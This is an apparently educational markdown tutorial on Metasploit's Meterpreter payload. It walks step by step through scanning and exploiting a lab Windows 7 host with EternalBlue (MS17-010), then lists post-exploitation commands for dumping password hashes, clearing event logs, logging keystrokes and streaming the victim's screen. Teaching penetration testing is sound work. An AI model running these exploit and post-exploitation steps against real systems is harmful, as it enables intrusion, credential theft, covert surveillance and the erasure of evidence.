# Meterpreter 
Overview
Meterpreter is an advanced, multifaceted payload within the Metasploit Framework, designed specifically for post-exploitation operations. <br>
Unlike standard payloads that may execute a single command and terminate, Meterpreter provides an interactive, dynamically extensible shell. This allows security professionals to maintain control over a compromised system and execute a comprehensive suite of post-exploitation tasks.

## Key capabilities include:

**Interactive Command Execution:** Enables the execution of multiple, sequential commands.

**File System Manipulation:** Facilitates the upload and download of files.

**Privilege Escalation:** mechanisms to migrate user access to higher authority levels.

**Information Gathering:** tools for user enumeration, hash dumping, and system profiling.

**Surveillance:** Features for capturing keystrokes, screenshots, and streaming microphone/webcam feeds.

## Architecture and Stealth
A defining characteristic of Meterpreter is its stealth implementation via DLL Injection. Traditional payloads often initiate new processes on a target machine, triggering alarms in Host Intrusion Detection Systems (HIDS) or Intrusion Prevention Systems (IPS).

### Meterpreter circumvents this by utilizing in-memory injection:

**Process Migration:** Instead of creating a new process, Meterpreter injects itself into a legitimate, running process on the target (e.g., explorer.exe or spoolsv.exe).

**Shared Libraries:** It operates using Dynamic Link Libraries (DLLs), allowing it to masquerade as standard system activity.

**Resilience:** By residing within a stable system process, the session becomes more persistent and difficult for security solutions to detect.

## Usage Demonstration
The following workflow outlines the exploitation of a Windows 7 target using the EternalBlue vulnerability (MS17-010) via Kali Linux.

## 1. Reconnaissance and Scanning
Begin by launching the Metasploit console and identifying vulnerable services on the target network.

```
msfconsole
```

Perform a service version scan on the target IP (e.g., 192.168.1.8) to identify open ports.

```
nmap -sV 192.168.1.8
```
Observation: The scan reveals an active Microsoft DS service on port 445 (SMB).

## 2. Vulnerability Analysis
Verify if the target is susceptible to the MS17-010 (EternalBlue) exploit.

```
search smb

use auxiliary/scanner/smb/smb_ms17_010
show options
set RHOSTS 192.168.1.8
run
```
Result: If the output confirms "Host is likely VULNERABLE," proceed to exploitation.

## 3. Exploitation
Configure the exploit module and the Meterpreter payload.

**Select the exploit**
```
use exploit/windows/smb/ms17_010_eternalblue
```
**Verify payload selection** 
 (Default: windows/x64/meterpreter/reverse_tcp)
```
show options
```
**Set target architecture parameters**
```
set RHOSTS 192.168.1.8
```
**Execute**
```
exploit
```
<br>

**Post-Exploitation Command Reference**
Once the session is established, the `meterpreter >` prompt allows for the execution of the following commands.

<br>

**System & Network Information**
| Command	|  Description |
|----------|:-----------|
| sysinfo	| Displays system architecture, OS version, and computer name. |
| ipconfig	| Shows network interface configurations (IP, netmask, gateway). |
| ps	| Lists all running processes on the target. |
| shell	| Spawns a native OS shell (cmd.exe). Type exit to return to Meterpreter. |

<br>

**File System Operations**
| Command |	Description |
|-----------|:-------------|
| ls / dir	| Lists the contents of the current directory.|
| cd [path]	| Changes the directory (e.g., cd C:).|
| download [source] | Transfers files from the target to the attacker machine.|
| upload [source]	| Transfers files from the attacker machine to the target.|
| execute -f [program]	| Runs a program on the target. Use -i for interaction.|

<br>

**Credential Harvesting & Security**
| Command	| Description |
|-----------|:------------|
| hashdump |	Extracts password hashes from the SAM database (requires Admin/System privileges). |
| clearev	| Wipes the Application, System, and Security event logs to cover tracks. |

<br>

**Surveillance & Interaction**
| Command	| Description |
|---------|:----------|
| screenshot	| Captures a still image of the target's desktop.|
| screenshare	| Streams the target's desktop in real-time.|
| keyscan_start	|  Starts capturing keystrokes.|

<br>

**Session Management**
| Command	| Description |
|-----------|:-----------|
| background	| Moves the current session to the background.  |
| sessions -i [id]	| Resumes interaction with a backgrounded session. |
| reboot / shutdown	| Restarts or powers off the target machine. |
| help	| Displays the full list of available commands. |



## Conclusion
Meterpreter remains an industry-standard tool for penetration testing due to its extensive functionality and stealth capabilities via DLL injection. By mastering these commands, security practitioners can effectively simulate advanced persistent threats (APTs) to assess the resilience of network defenses.
